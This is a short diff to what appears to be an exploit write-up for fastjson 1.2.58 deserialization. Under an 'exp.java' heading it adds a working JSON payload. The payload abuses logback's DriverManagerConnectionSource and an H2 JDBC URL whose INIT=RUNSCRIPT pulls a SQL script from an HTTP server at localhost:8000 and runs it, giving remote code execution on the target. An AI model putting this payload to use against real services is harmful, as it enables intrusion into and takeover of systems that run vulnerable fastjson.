@@ -20,6 +20,9 @@ http://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.58/fastjson-1.2.58.jar
 
 
 ### exp.java
+
+`{"@type":"ch.qos.logback.core.db.DriverManagerConnectionSource", "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}`
+
 ```
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
